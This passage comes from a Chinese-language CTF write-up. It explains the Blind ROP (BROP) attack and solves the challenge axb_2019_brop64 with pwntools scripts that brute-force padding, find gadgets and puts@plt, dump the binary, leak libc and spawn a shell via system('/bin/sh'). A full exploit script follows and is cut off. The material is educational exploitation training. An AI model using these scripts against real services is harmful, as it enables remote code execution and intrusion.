<td align="center">crash</td>
</tr>
<tr>
<td align="center">0x0</td>
<td align="center">0x0</td>
<td align="center">crash</td>
</tr>
<tr>
<td align="center">readable</td>
<td align="center">readable</td>
<td align="center">no-crash</td>
</tr>
</tbody></table>
<p>根据这个signature, 我们能够在很大可能性上找到<code>strcmp</code>对应的PLT项。</p>
<p>而对于<code>write</code>调用，虽然它没有这种类似的signature，但是我们可以通过检查所有的PLT项，然后触发其向某个socket写数据来检查<code>write</code>是否被调用了，如果<code>write</code>被调用了，那么我们就可以在本地看到传过来的内容了。</p>
<p>最后一步就是如何确定传给<code>write</code>的socket文件描述符是多少了。这里有两种办法：1. 同时调用好几次write，把它们串起来，然后传入不同的文件描述符数；2. 同时打开多个连接，然后使用一个相对较大的文件描述符数字，增加匹配的可能性。</p>
<p>到这一步为止，攻击者就能够将整个<code>.text</code>段从内存中通过socket写到本地来了，然后就可以对其进行反编译，找到其他更多的gadgets，同时，攻击者还可以dump那些symbol table之类的信息，找到PLT中其它对应的函数项如<code>dup2</code>和<code>execve</code>等。</p>
<p><strong>BROP的攻击流程 2 – 实施攻击</strong></p>
<p>到目前为止，最具挑战性的部分已经被解决了，我们已经可以得到被攻击进程的整个内存空间了，接下来就是按部就班了（从论文中翻译）：</p>
<ul>
<li>将socket重定向到标准输入/输出（standard input/output）。攻击者可以使用<code>dup2</code>或<code>close</code>，跟上<code>dup</code>或者<code>fcntl(F_DUPFD)</code>。这些一般都能在PLT里面找到。</li>
<li>在内存中找到<code>/bin/sh</code>。其中一个有效的方法是从symbol table里面找到一个可写区域（writable memory region），比如<code>environ</code>，然后通过socket将<code>/bin/sh</code>从攻击者这里读过去。</li>
<li><code>execve</code> shell. 如果<code>execve</code>不在PLT上, 那么攻击者就需要通过更多次的尝试来找到一个<code>pop rax; ret</code>和<code>syscall</code>的gadget.</li>
</ul>
<p>归纳起来，BROP攻击的整个步骤是这样的：</p>
<ul>
<li>通过一个已知的stack overflow的漏洞，并通过stack reading的方式绕过stack canary的防护，试出某个可用的return address；</li>
<li>寻找<code>stop gadget</code>：一般情况下这会是一个在PLT中的blocking系统调用的地址（sleep等），在这一步中，攻击者也可以找到PLT的合法项；</li>
<li>寻找<code>BROP gadget</code>：这一步之后攻击者就能够控制<code>write</code>系统调用的前两个参数了；</li>
<li>通过signature的方式寻找到PLT上的<code>strcmp</code>项，然后通过控制字符串的长度来给<code>%rdx</code>赋值，这一步之后攻击者就能够控制<code>write</code>系统调用的第三个参数了；</li>
<li>寻找PLT中的<code>write</code>项：这一步之后攻击者就能够将整个内存从远端dump到本地，用于寻找更多的gadgets；</li>
<li>有了以上的信息之后，就可以创建一个shellcode来实施攻击了。</li>
</ul>
<h3 id="以axb-2019-brop64为例"><a href="#以axb-2019-brop64为例" class="headerlink" title="以axb_2019_brop64为例"></a>以axb_2019_brop64为例</h3><p>⚠：本题目在BUUOJ上已被搭建，但是题目给出了源文件，原题为盲打题目，此处也只利用nc接口解题。</p>
<p><strong>漏洞探测</strong></p>
<p>尝试nc后发送<code>%p</code>、<code>%s</code>、<code>%x</code>等格式化控制字符，发现没有任何异常回显，考虑使用BROP攻击。</p>
<p><strong>暴力确定padding</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Force_find_padding</span>():</span></span><br><span class="line">    padding_length=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            padding_length=padding_length+<span class="number">1</span></span><br><span class="line">            sh = process(<span class="string">&quot;./axb_2019_brop64&quot;</span>)</span><br><span class="line">            sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">            sh.send(<span class="string">&#x27;A&#x27;</span> * padding_length)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Goodbye!&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> sh.recvall():</span><br><span class="line">                <span class="keyword">raise</span> <span class="string">&quot;Programe not exit normally!&quot;</span></span><br><span class="line">            sh.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            log.success(<span class="string">&quot;The true padding length is &quot;</span>+<span class="built_in">str</span>(padding_length-<span class="number">1</span>))</span><br><span class="line">            <span class="keyword">return</span> padding_length</span><br><span class="line">    log.error(<span class="string">&quot;We don&#x27;t find true padding length!&quot;</span>)</span><br><span class="line"></span><br><span class="line">padding_length=null</span><br><span class="line"><span class="keyword">if</span> padding_length <span class="keyword">is</span> null:</span><br><span class="line">    padding_length=Force_find_padding()</span><br><span class="line"><span class="comment"># [+] The true padding length is 216</span></span><br></pre></td></tr></table></figure>
<p><strong>寻找<code>stop gadget</code></strong></p>
<p>此处我们希望我们能够爆破出main函数的首地址，进而直接让程序回到main函数进行执行。首先此处我们可以先泄露原来的返回地址，进而缩小爆破范围。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">old_return_addr=null</span><br><span class="line"><span class="keyword">if</span> old_return_addr <span class="keyword">is</span> null:</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;A&#x27;</span> * padding_length)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;A&#x27;</span> * padding_length)</span><br><span class="line">    old_return_addr=u64(sh.recvuntil(<span class="string">&#x27;Goodbye!&#x27;</span>).strip(<span class="string">&#x27;Goodbye!&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;x00&#x27;</span>))</span><br><span class="line">    log.info(<span class="string">&#x27;The old return address is &#x27;</span>+ <span class="built_in">hex</span>(old_return_addr))</span><br><span class="line"><span class="comment"># [*] The old return address is 0x400834</span></span><br></pre></td></tr></table></figure>
<p>那么我们可以写出爆破脚本(爆破范围是0x0000~0xFFFF)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Find_stop_gadget</span>(<span class="params">old_return_addr,padding_length</span>):</span></span><br><span class="line">    maybe_low_byte=<span class="number">0x0000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = process(<span class="string">&quot;./axb_2019_brop64&quot;</span>)</span><br><span class="line">            sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">            sh.send(<span class="string">&#x27;A&#x27;</span> * padding_length + p16(maybe_low_byte))</span><br><span class="line">            <span class="keyword">if</span> maybe_low_byte &gt; <span class="number">0xFFFF</span>:</span><br><span class="line">                log.error(<span class="string">&quot;All low byte is wrong!&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> sh.recvall(timeout=<span class="number">1</span>):</span><br><span class="line">                log.success(<span class="string">&quot;We found a stop gadget is &quot;</span> + <span class="built_in">hex</span>(old_return_addr+maybe_low_byte))</span><br><span class="line">                <span class="keyword">return</span> (old_return_addr+padding_length)</span><br><span class="line">            maybe_low_byte=maybe_low_byte+<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            sh.close()</span><br><span class="line"><span class="comment">#[+] We found a stop gadget is 0x4007d6</span></span><br></pre></td></tr></table></figure>
<p><strong>寻找<code>BROP gadget</code></strong></p>
<p>这里我们试图寻找到<code>__libc_csu_init</code>函数，根据之前提到的程序启动过程（见前置知识），<code>__libc_csu_init</code>函数会被<code>__libc_start_main</code>所调用，也就是说，程序中一定存在<code>__libc_csu_init</code>函数，而根据之前的<code>__libc_csu_init</code>函数的利用（见前置知识）,我们可以构造如下payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload  = <span class="string">&#x27;A&#x27;</span> * padding_length </span><br><span class="line">payload += p64(libc_csu_init_address) </span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">6</span> </span><br><span class="line">payload += p64(stop_gadget) + p64(<span class="number">0</span>) * <span class="number">10</span></span><br></pre></td></tr></table></figure>
<p>如果libc_csu_init_address是<code>pop rbx</code>处，程序将会再次回到stop_gadget。</p>
<p>那么我们可以写出爆破脚本(爆破范围是0x0000~0xFFFF)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Find_brop_gadget</span>(<span class="params">libc_csu_init_address_maybe,padding_length,stop_gadget</span>):</span></span><br><span class="line">    maybe_low_byte=<span class="number">0x0000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = process(<span class="string">&quot;./axb_2019_brop64&quot;</span>)</span><br><span class="line">            sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">            payload  = <span class="string">&#x27;A&#x27;</span> * padding_length </span><br><span class="line">            payload += p64(libc_csu_init_address_maybe+maybe_low_byte) </span><br><span class="line">            payload += p64(<span class="number">0</span>) * <span class="number">6</span> </span><br><span class="line">            payload += p64(stop_gadget) + p64(<span class="number">0</span>) * <span class="number">10</span></span><br><span class="line">            sh.send(payload)</span><br><span class="line">            <span class="keyword">if</span> maybe_low_byte &gt; <span class="number">0xFFFF</span>:</span><br><span class="line">                log.error(<span class="string">&quot;All low byte is wrong!&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> sh.recvall(timeout=<span class="number">1</span>):</span><br><span class="line">                log.success(</span><br><span class="line">                    <span class="string">&quot;We found a brop gadget is &quot;</span> + <span class="built_in">hex</span>(</span><br><span class="line">                        libc_csu_init_address_maybe+maybe_low_byte</span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">return</span> (libc_csu_init_address_maybe+maybe_low_byte)</span><br><span class="line">            maybe_low_byte=maybe_low_byte+<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            sh.close()</span><br><span class="line"><span class="comment">#[+] We found a brop gadget is 0x40095A</span></span><br></pre></td></tr></table></figure>
<p><strong>寻找puts<a target="_blank" rel="noopener" href="https://github.com/plt">@plt</a></strong></p>
<p>接下来我们尝试找到puts的plt表地址，我们根据上面的泄露结果可以很明显的发现程序并没有开启ASLR保护，那么程序的加载地址必然位于0x400000，那么我们让puts输出0x400000处的内容，若地址正确，则输出结果必然包括‘ELF’。</p>
<p>那么我们可以写出爆破脚本(爆破范围是0x0000~0xFFFF)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Find_func_plt</span>(<span class="params">func_plt_maybe,padding_length,stop_gadget,brop_gadget</span>):</span></span><br><span class="line">    maybe_low_byte=<span class="number">0x0600</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = process(<span class="string">&quot;./axb_2019_brop64&quot;</span>)</span><br><span class="line">            sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">            payload  = <span class="string">&#x27;A&#x27;</span> * padding_length </span><br><span class="line">            payload += p64(brop_gadget+<span class="number">9</span>) <span class="comment"># pop rdi;ret;</span></span><br><span class="line">            payload += p64(<span class="number">0x400000</span>)</span><br><span class="line">            payload += p64(func_plt_maybe+maybe_low_byte)</span><br><span class="line">            payload += p64(stop_gadget)</span><br><span class="line">            sh.send(payload)</span><br><span class="line">            <span class="keyword">if</span> maybe_low_byte &gt; <span class="number">0xFFFF</span>:</span><br><span class="line">                log.error(<span class="string">&quot;All low byte is wrong!&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;ELF&quot;</span> <span class="keyword">in</span> sh.recvall(timeout=<span class="number">1</span>):</span><br><span class="line">                log.success(</span><br><span class="line">                    <span class="string">&quot;We found a function plt address is &quot;</span> + <span class="built_in">hex</span>(func_plt_maybe+maybe_low_byte)</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">return</span> (func_plt_maybe+maybe_low_byte)</span><br><span class="line">            maybe_low_byte=maybe_low_byte+<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            sh.close()</span><br><span class="line"><span class="comment">#[+] We found a function plt address is 0x400635</span></span><br></pre></td></tr></table></figure>
<p><strong>利用puts<a target="_blank" rel="noopener" href="https://github.com/plt">@plt</a>，Dump源文件</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Dump_file</span>(<span class="params">func_plt,padding_length,stop_gadget,brop_gadget</span>):</span></span><br><span class="line">    process_old_had_received_length=<span class="number">0</span></span><br><span class="line">    process_now_had_received_length=<span class="number">0</span></span><br><span class="line">    file_content=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = process(<span class="string">&quot;./axb_2019_brop64&quot;</span>)</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">                payload  = <span class="string">&#x27;A&#x27;</span> * (padding_length - <span class="built_in">len</span>(<span class="string">&#x27;Begin_leak-----&gt;&#x27;</span>))</span><br><span class="line">                payload += <span class="string">&#x27;Begin_leak-----&gt;&#x27;</span></span><br><span class="line">                payload += p64(brop_gadget+<span class="number">9</span>) <span class="comment"># pop rdi;ret;</span></span><br><span class="line">                payload += p64(<span class="number">0x400000</span>+process_now_had_received_length)</span><br><span class="line">                payload += p64(func_plt)</span><br><span class="line">                payload += p64(stop_gadget)</span><br><span class="line">                sh.send(payload)</span><br><span class="line">                sh.recvuntil(<span class="string">&#x27;Begin_leak-----&gt;&#x27;</span> + p64(brop_gadget+<span class="number">9</span>).strip(<span class="string">&#x27;x00&#x27;</span>))</span><br><span class="line">                received_data = sh.recvuntil(<span class="string">&#x27;x0AHello&#x27;</span>)[:-<span class="number">6</span>]</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(received_data) == <span class="number">0</span> :</span><br><span class="line">                    file_content += <span class="string">&#x27;x00&#x27;</span></span><br><span class="line">                    process_now_had_received_length += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span> :</span><br><span class="line">                    file_content += received_data</span><br><span class="line">                    process_now_had_received_length += <span class="built_in">len</span>(received_data)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">if</span> process_now_had_received_length == process_old_had_received_length :</span><br><span class="line">                log.info(<span class="string">&#x27;We get &#x27;</span> + <span class="built_in">str</span>(process_old_had_received_length) +<span class="string">&#x27; byte file!&#x27;</span>)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;axb_2019_brop64_dump&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> fout:</span><br><span class="line">                    fout.write(file_content)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            process_old_had_received_length = process_now_had_received_length</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="comment">#[*] We get 4096 byte file!</span></span><br></pre></td></tr></table></figure>
<p><strong>IDA文件修复&amp;分析</strong></p>
<p>注意此处至多泄露0x1000个字节，也就是一个内存页。</p>
<p>我们把泄露的文件使用IDA进行分析。</p>
<p><a target="_blank" rel="noopener" href="https://p2.ssl.qhimg.com/dm/1024_886_/t01f6e5f7ba1a0c5ed3.png"><img src="%E7%9B%B2%E6%89%93/t01f6e5f7ba1a0c5ed3.png" alt="img"></a></p>
<p>我们刚刚已经泄露出了main函数的地址，我们对其进行函数的建立。</p>
<p>⚠：此时我们会发现我们之前认为的puts<a target="_blank" rel="noopener" href="https://github.com/plt">@plt</a>，其实是错误的，正确的应该是0x400640。这是因为0x400650恰好是plt表头的原因。</p>
<p><a target="_blank" rel="noopener" href="https://p4.ssl.qhimg.com/dm/1024_382_/t01b17f9982c501eae3.png"><img src="%E7%9B%B2%E6%89%93/t01b17f9982c501eae3.png" alt="img"></a></p>
<p><strong>泄露puts的got表地址，Leak libc base</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">payload  = <span class="string">&#x27;A&#x27;</span> * (padding_length - <span class="built_in">len</span>(<span class="string">&#x27;Begin_leak-----&gt;&#x27;</span>))</span><br><span class="line">payload += <span class="string">&#x27;Begin_leak-----&gt;&#x27;</span></span><br><span class="line">payload += p64(brop_gadget+<span class="number">9</span>) <span class="comment"># pop rdi;ret;</span></span><br><span class="line">payload += p64(puts_got_addr)</span><br><span class="line">payload += p64(puts_plt_addr)</span><br><span class="line">payload += p64(stop_gadget)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Begin_leak-----&gt;&#x27;</span> + p64(brop_gadget+<span class="number">9</span>).strip(<span class="string">&#x27;x00&#x27;</span>))</span><br><span class="line">puts_addr = u64(sh.recvuntil(<span class="string">&#x27;x0AHello&#x27;</span>)[:-<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">payload  = <span class="string">&#x27;A&#x27;</span> * padding_length</span><br><span class="line">payload += p64(brop_gadget+<span class="number">9</span>) <span class="comment"># pop rdi;ret;</span></span><br><span class="line">payload += p64(bin_sh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">payload += p64(stop_gadget)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.interactive()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure>
<p><strong>EXP</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sh</span>():</span></span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(<span class="string">&quot;./axb_2019_brop64&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Force_find_padding</span>():</span></span><br><span class="line">    padding_length=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            padding_length=padding_length+<span class="number">1</span></span><br><span class="line">            sh = get_sh()</span><br><span class="line">            sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">            sh.send(<span class="string">&#x27;A&#x27;</span> * padding_length)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Goodbye!&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> sh.recvall():</span><br><span class="line">                <span class="keyword">raise</span> <span class="string">&quot;Programe not exit normally!&quot;</span></span><br><span class="line">            sh.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            log.success(<span class="string">&quot;The true padding length is &quot;</span>+<span class="built_in">str</span>(padding_length-<span class="number">1</span>))</span><br><span class="line">            <span class="keyword">return</span> padding_length</span><br><span class="line">    log.error(<span class="string">&quot;We don&#x27;t find true padding length!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Find_stop_gadget</span>(<span class="params">old_return_addr,padding_length</span>):</span></span><br><span class="line">    maybe_low_byte=<span class="number">0x0000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = get_sh()</span><br><span class="line">            sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">            sh.send(<span class="string">&#x27;A&#x27;</span> * padding_length + p16(maybe_low_byte))</span><br><span class="line">            <span class="keyword">if</span> maybe_low_byte &gt; <span class="number">0xFFFF</span>:</span><br><span class="line">                log.error(<span class="string">&quot;All low byte is wrong!&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> sh.recvall(timeout=<span class="number">1</span>):</span><br><span class="line">                log.success(<span class="string">&quot;We found a stop gadget is &quot;</span> + <span class="built_in">hex</span>(old_return_addr+maybe_low_byte))</span><br><span class="line">                <span class="keyword">return</span> (old_return_addr+padding_length)</span><br><span class="line">            maybe_low_byte=maybe_low_byte+<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            sh.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 